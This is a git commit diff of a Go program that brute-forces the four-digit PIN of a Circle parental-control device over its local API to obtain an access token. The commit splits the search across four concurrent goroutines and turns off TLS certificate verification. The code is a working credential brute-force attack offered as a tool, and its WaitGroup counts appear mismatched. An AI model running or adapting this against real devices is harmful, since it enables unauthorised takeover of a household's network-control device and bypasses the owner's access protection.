8f6038b23462cc4ab25fdb130264ca182739eefa
James Newell <jnewell@rajant.com>
2016-05-05 22:28:05 -0400

    experiment with concurrent sessions

--- circleme.go
+++ circleme.go
@@ -8,35 +8,20 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"sync"
+	"time"
 )
 
-type Result struct {
-	Result string
-	Error  string
-	Token  string
+type CircleSession struct {
+	Client    http.Client
+	IpAddress string
+	Wg        sync.WaitGroup
 }
 
 const APPID = "HackMyCircleDevice99" // min length: 20
 
-func main() {
-
-	if len(os.Args) < 2 {
-		fmt.Printf("usage: %v: <circle-ip-address>\n", os.Args[0])
-		os.Exit(1)
-	}
-
-	ipAddress := os.Args[1]
-	fmt.Printf("using ip address: %v\n", ipAddress)
-
-	// NOTE: the following line doesn't work because the Circle device
-	// doesn't have a certificate.  so, use an insecure connection instead
-	//		res, err := http.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	}
-	client := &http.Client{Transport: tr}
-
-	for x := 0; x <= 9999; x++ {
+func (session *CircleSession) findCircleToken(start int, stop int) {
+	for x := start; x <= stop; x++ {
 		pincode := fmt.Sprintf("%04d", x)
 		// show some progress
 		if (x % 10) == 0 {
@@ -47,7 +32,12 @@ func main() {
 		hash := fmt.Sprintf("%x", h.Sum(nil))
 		//		fmt.Println(hash)
 
-		res, err := client.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
+		start := time.Now()
+
+		res, err := session.Client.Get("https://" + session.IpAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
+		if (x % 10) == 0 {
+			fmt.Printf("Get(): time elapsed: %v\n", time.Since(start))
+		}
 		if err != nil {
 			fmt.Println(err.Error())
 			os.Exit(1)
@@ -73,6 +63,33 @@ func main() {
 			}
 		}
 	}
+}
 
+func main() {
+
+	if len(os.Args) < 2 {
+		fmt.Printf("usage: %v: <circle-ip-address>\n", os.Args[0])
+		os.Exit(1)
+	}
+
+	ipAddress := os.Args[1]
+	fmt.Printf("using ip address: %v\n", ipAddress)
+
+	// NOTE: the following line doesn't work because the Circle device
+	// doesn't have a certificate.  so, use an insecure connection instead
+	//		res, err := http.Get("https://" + ipAddress + ":4567/api/TOKEN?appid=" + APPID + "&hash=" + hash)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	session := &CircleSession{Client: http.Client{Transport: tr}, IpAddress: ipAddress}
+	session.Wg.Add(1)
+	go session.findCircleToken(0, 2500)
+	session.Wg.Add(2)
+	go session.findCircleToken(2501, 5000)
+	session.Wg.Add(2)
+	go session.findCircleToken(5001, 7500)
+	session.Wg.Add(2)
+	go session.findCircleToken(7501, 9999)
+	session.Wg.Wait()
 	os.Exit(0)
 }
